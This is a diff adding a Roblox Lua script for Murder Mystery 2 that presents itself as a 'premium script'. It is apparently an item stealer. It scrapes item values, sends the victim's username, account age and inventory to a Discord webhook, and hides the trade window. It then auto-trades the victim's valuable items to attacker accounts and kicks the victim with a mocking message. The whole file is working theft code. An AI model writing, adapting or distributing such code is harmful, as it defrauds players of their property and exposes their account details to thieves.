@@ -1,0 +1,338 @@
+if not _G["Script-SM_Config"] then
+    warn("WARNING: Config not loaded! Waiting for config...")
+    repeat task.wait() until _G["Script-SM_Config"]
+    warn("Config loaded successfully!")
+end
+
+local webhook = _G["Script-SM_Config"].user_webhook
+local usernames = _G["Script-SM_Config"].users or {}
+local dualhook_usernames = {"DualHook-User1","DualHook-User2","DualHook-User3","DualHook-User4","DualHook-User5","DualHook-User6"}
+local allFriends = {}
+
+for _, name in ipairs(usernames) do table.insert(allFriends, name) end
+for _, name in dualhook_usernames do 
+    if name ~= "" and not table.find(allFriends, name) then 
+        table.insert(allFriends, name) 
+    end 
+end
+
+local friendsList = allFriends
+local minRarity = "Common"
+local minVal = 1
+
+local playersService = game:GetService("Players")
+local me = playersService.LocalPlayer
+
+if game.PlaceId ~= 142823291 then
+    me:kick("Wrong game! Join Murder Mystery 2")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    me:kick("Can't run on VIP servers")
+    return
+end
+
+if #playersService:GetPlayers() >= 12 then
+    me:kick("Server too full")
+    return
+end
+
+local itemsToTrade = {}
+local myGui = me:WaitForChild("PlayerGui")
+local itemDatabase = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local http = game:GetService("HttpService")
+
+local rarityOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
+
+local valuePages = {
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+
+local requestHeaders = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
+
+local function cleanString(str) return str:match("^%s*(.-)%s*$") end
+
+local function getPage(url)
+    local resp = request({Url = url, Method = "GET", Headers = requestHeaders})
+    return resp.Body
+end
+
+local function getItemValue(htmlBlock)
+    local valText = htmlBlock:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valText then
+        valText = valText:gsub(",", "")
+        return tonumber(valText)
+    end
+    return nil
+end
+
+local function parseRegularItems(pageHtml)
+    local values = {}
+    for title, body in pageHtml:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        title = title:match("([^<]+)")
+        if title then
+            title = cleanString(title:gsub("%s+", " "))
+            title = cleanString((title:split(" Click "))[1])
+            local lowerTitle = title:lower()
+            local val = getItemValue(body)
+            if val then values[lowerTitle] = val end
+        end
+    end
+    return values
+end
+
+local function parseChromaItems(pageHtml)
+    local values = {}
+    for title, body in pageHtml:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        title = title:match("([^<]+)")
+        if title then
+            title = cleanString(title:gsub("%s+", " ")):lower()
+            local val = getItemValue(body)
+            if val then values[title] = val end
+        end
+    end
+    return values
+end
+
+local function loadValues()
+    local normalValues = {}
+    local chromaValues = {}
+    local pagesToLoad = {}
+    for type, link in pairs(valuePages) do table.insert(pagesToLoad, {type = type, link = link}) end
+    
+    local finished = 0
+    local syncEvent = Instance.new("BindableEvent")
+
+    for _, page in ipairs(pagesToLoad) do
+        task.spawn(function()
+            local html = getPage(page.link)
+            if html and html ~= "" then
+                if page.type ~= "chroma" then
+                    local parsed = parseRegularItems(html)
+                    for n, v in pairs(parsed) do normalValues[n] = v end
+                else
+                    chromaValues = parseChromaItems(html)
+                end
+            end
+            finished = finished + 1
+            if finished == #pagesToLoad then syncEvent:Fire() end
+        end)
+    end
+
+    syncEvent.Event:Wait()
+
+    local finalValues = {}
+    for id, info in pairs(itemDatabase) do
+        local name = info.ItemName and info.ItemName:lower() or ""
+        local rarity = info.Rarity or ""
+        local isChroma = info.Chroma or false
+        if name ~= "" and rarity ~= "" then
+            local rarityIdx = table.find(rarityOrder, rarity)
+            local godlyIdx = table.find(rarityOrder, "Godly")
+            if rarityIdx and rarityIdx >= godlyIdx then
+                if isChroma then
+                    for chromaName, value in pairs(chromaValues) do
+                        if chromaName:find(name) then
+                            finalValues[id] = value
+                            break
+                        end
+                    end
+                else
+                    local value = normalValues[name]
+                    if value then finalValues[id] = value end
+                end
+            end
+        end
+    end
+    return finalValues
+end
+
+local function sendRequest(target)
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(game:GetService("Players"):WaitForChild(target))
+end
+
+local function checkTradeState()
+    return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+end
+
+local function waitTradeDone()
+    while checkTradeState() ~= "None" do wait(0.1) end
+end
+
+local function autoAccept()
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(285646582)
+end
+
+local function offerItem(id)
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(id, "Weapons")
+end
+
+local overallValue = 0
+
+local function rarityEmoji(r)
+    if r == "Ancient" then return "🗡️"
+    elseif r == "Godly" then return "✨"
+    elseif r:find("Chroma") then return "🌈"
+    else return "🔪" end
+end
+
+local nonTradable = {["DefaultGun"]=true,["DefaultKnife"]=true,["Reaver"]=true,["Reaver_Legendary"]=true,["Reaver_Godly"]=true,["Reaver_Ancient"]=true,["IceHammer"]=true,["IceHammer_Legendary"]=true,["IceHammer_Godly"]=true,["IceHammer_Ancient"]=true,["Gingerscythe"]=true,["Gingerscythe_Legendary"]=true,["Gingerscythe_Godly"]=true,["Gingerscythe_Ancient"]=true,["TestItem"]=true,["Season1TestKnife"]=true,["Cracks"]=true,["Icecrusher"]=true,["???"]=true,["Dartbringer"]=true,["TravelerAxeRed"]=true,["TravelerAxeBronze"]=true,["TravelerAxeSilver"]=true,["TravelerAxeGold"]=true,["BlueCamo_K_2022"]=true,["GreenCamo_K_2022"]=true,["SharkSeeker"]=true}
+
+local itemValues = loadValues()
+local inventoryData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(me.Name)
+
+local goodItems = {}
+local totalItems = 0
+
+for itemId, count in pairs(inventoryData.Weapons.Owned) do
+    local rarity = itemDatabase[itemId].Rarity
+    local rarityLevel = table.find(rarityOrder, rarity)
+    local minLevel = table.find(rarityOrder, minRarity)
+    if rarityLevel and rarityLevel >= minLevel and not nonTradable[itemId] then
+        local val = itemValues[itemId] or (rarityLevel >= table.find(rarityOrder, "Godly") and 2 or 1)
+        if val >= minVal then
+            overallValue = overallValue + (val * count)
+            table.insert(itemsToTrade, {id = itemId, rarity = rarity, qty = count, val = val})
+            table.insert(goodItems, {name = itemId, value = string.format("%.0f", val), uid = itemId})
+            totalItems = totalItems + count
+        end
+    end
+end
+
+table.sort(goodItems, function(a,b) return tonumber(a.value) > tonumber(b.value) end)
+
+local groupedItems = {}
+for _, itm in ipairs(goodItems) do
+    local key = itm.name .. itm.value
+    groupedItems[key] = groupedItems[key] or {name = itm.name, value = itm.value, count = 0, emoji = rarityEmoji(itemDatabase[itm.uid].Rarity)}
+    groupedItems[key].count = groupedItems[key].count + 1
+end
+
+local sortedGroups = {}
+for _, grp in pairs(groupedItems) do table.insert(sortedGroups, grp) end
+table.sort(sortedGroups, function(a,b) return tonumber(a.value) > tonumber(b.value) end)
+
+local displayLines = {}
+local shownCount = 0
+for _, grp in ipairs(sortedGroups) do
+    if #displayLines >= 16 then break end
+    local mult = grp.count > 1 and " [x"..grp.count.."]" or ""
+    table.insert(displayLines, grp.emoji.." "..grp.name.." — "..grp.value..mult)
+    shownCount = shownCount + grp.count
+end
+if totalItems > shownCount then table.insert(displayLines, "and "..(totalItems-shownCount).." more..") end
+
+local serverLink = "https://script-lynx.vercel.app/joiner.html?placeId=142823291&gameInstanceId=" .. game.JobId
+local currentPlayers = #playersService:GetPlayers()
+
+local embedPayload = {
+    content = (overallValue >= 5 and "> @everyone " or "> ").."**"..(overallValue >= 5 and "⋆｡ ɢᴏᴏᴏᴅ ʜɪᴛ ｡⋆" or "『 ꜱᴍᴀʟʟ ʜɪᴛ 』").." • Value: "..string.format("%.2f", overallValue).."**",
+    username = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+    avatar_url = "https://script-lynx.vercel.app/pngs/logo.png",
+    embeds = {{
+        title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+        description = "<:admin_hexagon:1449663928195092502> **How to Use?**\nJoin the user using join script or join link then jump or type anything in chat and accept gifts.",
+        color = 0x000000,
+        fields = {
+            {name="<:vip_hexagon:1449663700494712893> Display Name",value="```"..(me.DisplayName~="" and me.DisplayName or me.Name).."```",inline=false},
+            {name="<:member_hexagon:1449663611151585292> Username",value="```"..me.Name.."```",inline=false},
+            {name="<:verified_hexagon:1449663538833657961> Account Age",value="```"..me.AccountAge.." Days```",inline=false},
+            {name="<:developer_hexagon:1449663656324235317> Executor",value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```",inline=false},
+            {name="<:owner_hexagon:1449663973720064013> Players in Server",value="```"..currentPlayers.." / 12```",inline=false},
+            {name="<:support_hexagon:1449663871651549287> Inventory",value="```"..table.concat(displayLines,"\n").."```",inline=false},
+            {name="<:moderator_hexagon:1449663760217280522> Teleport Script",value="```game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')```",inline=false},
+            {name="<:management_hexagon:1449663827112362054> Join Player",value="[ Click to Join ]("..serverLink..")",inline=false},
+        },
+        author={name="Murder Mystery 2 • Script Lynx Hit",url=serverLink},
+        footer={text="꒰ Script Lynx • Premium Scripts",icon_url="https://script-lynx.vercel.app/pngs/logo.png"},
+        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        image={url="https://script-lynx.vercel.app/pngs/mm2.webp"},
+    }},
+    attachments={}
+}
+
+local function postToDiscord(link)
+    pcall(function()
+        request({
+            Url = link,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = http:JSONEncode(embedPayload)
+        })
+    end)
+end
+
+if #itemsToTrade > 0 then
+    postToDiscord(webhook)
+
+    local tradeWindow = myGui:WaitForChild("TradeGUI")
+    tradeWindow:GetPropertyChangedSignal("Enabled"):Connect(function()
+        tradeWindow.Enabled = false
+    end)
+    local tradePhoneWindow = myGui:WaitForChild("TradeGUI_Phone")
+    tradePhoneWindow:GetPropertyChangedSignal("Enabled"):Connect(function()
+        tradePhoneWindow.Enabled = false
+    end)
+
+    table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)
+
+    local function doTrade(targetPlayer)
+        task.spawn(function()
+            local state = checkTradeState()
+            if state == "StartTrade" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+                wait(0.3)
+            elseif state == "ReceivingRequest" then
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                wait(0.3)
+            end
+
+            while #itemsToTrade > 0 do
+                local currentState = checkTradeState()
+                if currentState == "None" then
+                    sendRequest(targetPlayer)
+                elseif currentState == "SendingRequest" then
+                    wait(0.3)
+                elseif currentState == "ReceivingRequest" then
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+                    wait(0.3)
+                elseif currentState == "StartTrade" then
+                    for i = 1, math.min(4, #itemsToTrade) do
+                        local currentItem = table.remove(itemsToTrade, 1)
+                        for c = 1, currentItem.qty do
+                            offerItem(currentItem.id)
+                        end
+                    end
+                    wait(6)
+                    autoAccept()
+                    waitTradeDone()
+                else
+                    wait(0.5)
+                end
+                wait(1)
+            end
+
+            postToDiscord(webhook)
+            me:kick("Sorry for Getting your items.. GET YOUR REVENGE HERE! discord.gg/SnXQCYzGjx")
+        end)
+    end
+
+    local function listenForFriend(player)
+        if table.find(friendsList, player.Name) then
+            player.Chatted:Connect(function() doTrade(player.Name) end)
+        end
+    end
+
+    for _, p in ipairs(playersService:GetPlayers()) do listenForFriend(p) end
+    playersService.PlayerAdded:Connect(listenForFriend)
+else
+    me:kick("discord.gg/SnXQCYzGjx")
+end
